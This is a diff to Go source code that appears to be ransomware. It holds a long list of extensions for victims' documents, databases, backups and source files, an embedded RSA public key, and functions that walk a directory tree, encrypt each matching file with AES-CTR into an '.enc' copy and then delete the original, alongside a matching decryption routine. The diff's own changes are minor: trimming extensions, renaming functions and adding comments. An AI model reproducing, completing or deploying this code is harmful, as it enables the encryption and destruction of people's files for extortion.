@@ -16,8 +16,8 @@ import (
 var plaintext []byte
 
 var exts = []string{".mp4", ".avi", ".mp3", ".jpg", ".odt", ".mid", ".wma", ".flv", ".mkv", ".mov", ".avi", ".asf", ".mpeg", ".vob", ".mpg", ".wmv", ".fla", ".swf",
-	".wav", ".qcow2", ".vmx", ".gpg", ".aes", ".ARC", ".PAQ", ".tar.bz2", ".tbk", ".bak", ".tar", ".tgz", ".rar", ".zip", ".djv", ".djvu", ".svg",
-	".bmp", ".png", ".gif", ".raw", ".cgm", ".jpeg", ".jpg", ".tif", ".tiff", ".NEF", ".psd", ".cmd", ".bat", ".class", ".jar", ".java", ".asp",
+	".wav", ".qcow2", ".vmx", ".gpg", ".aes", ".ARC", ".PAQ", ".tbk", ".bak", ".djv", ".djvu",
+	".bmp", ".png", ".gif", ".raw", ".cgm", ".jpeg", ".jpg", ".tif", ".tiff", ".NEF", ".psd", ".cmd", ".bat", ".class", ".java", ".asp",
 	".brd", ".sch", ".dch", ".dip", ".vbs", ".asm", ".pas", ".cpp", ".php", ".ldf", ".mdf", ".ibd", ".MYI", ".MYD", ".frm", ".odb", ".dbf",
 	".mdb", ".sql", ".SQLITEDB", ".SQLITE3", ".asc", ".lay6", ".lay", ".ms11", ".sldm", ".sldx", ".ppsm", ".ppsx", ".ppam", ".docb", ".mml",
 	".sxm", ".otg", ".odg", ".uop", ".potx", ".potm", ".pptx", ".pptm", ".std", ".sxd", ".pot", ".pps", ".sti", ".sxi", ".otp", ".odp", ".wks",
@@ -38,13 +38,14 @@ Kl9TBjPjNjAKb4XF2kKZepMjOM2sgLsdAotYAZcUiczssmgxkHaUpoYtTs6YJadE
 ypklH1uu6oM6xiVK/wIEDhO6Xw==
 -----END PUBLIC KEY-----`
 
+// EncryptDocumets Walks documments in a path and encript or decrypts them.
 func EncryptDocumets(path string, mode bool) {
 	if mode {
 		//Encrypt
-		filepath.Walk(path, Visit)
+		filepath.Walk(path, visit)
 	} else {
 		//Decrpy
-		filepath.Walk(path, VisitD)
+		filepath.Walk(path, visitD)
 	}
 
 }
@@ -53,7 +54,7 @@ func InitializeBlock() {
 	stream = cipher.NewCTR(block, iv[:])
 }
 
-func Visit(path string, f os.FileInfo, err error) error {
+func visit(path string, f os.FileInfo, err error) error {
 	for _, folder := range badfolders {
 		if strings.Contains(path, folder) {
 			return nil
@@ -70,13 +71,14 @@ func Visit(path string, f os.FileInfo, err error) error {
 	}
 	return nil
 }
-func VisitD(path string, f os.FileInfo, err error) error {
+func visitD(path string, f os.FileInfo, err error) error {
 	if strings.Contains(path, ".enc") && !f.IsDir() {
 		StreamDecrypter(path)
 	}
 	return nil
 }
 
+// StreamDecrypter decryps a file given its filepath
 func StreamDecrypter(path string) {
 	inFile, err := os.Open(path)
 	if err != nil {
@@ -102,6 +104,7 @@ func StreamDecrypter(path string) {
 	os.Remove(path)
 }
 
+// StreamEncrypter encrypts a file given its filepatth
 func StreamEncrypter(path string) {
 
 	inFile, err := os.Open(path)
@@ -125,21 +128,3 @@ func StreamEncrypter(path string) {
 	outFile.Close()
 	os.Remove(path)
 }
-
-/*
-func AesEncrypt(plaintext []byte, key_text string) []byte {
-	c, _ := aes.NewCipher([]byte(key_text))
-	ciphertext := make([]byte, len(plaintext))
-	cfb := cipher.NewCFBEncrypter(c, iv)
-	cfb.XORKeyStream(ciphertext, plaintext)
-	return ciphertext
-}
-
-func AesDecrytp(ciphertext []byte, key_text string) []byte {
-	c, _ := aes.NewCipher([]byte(key_text))
-	cfbdec := cipher.NewCFBDecrypter(c, iv)
-	plaintextCopy := make([]byte, len(ciphertext))
-	cfbdec.XORKeyStream(plaintextCopy, ciphertext)
-	return plaintextCopy
-
-}*/
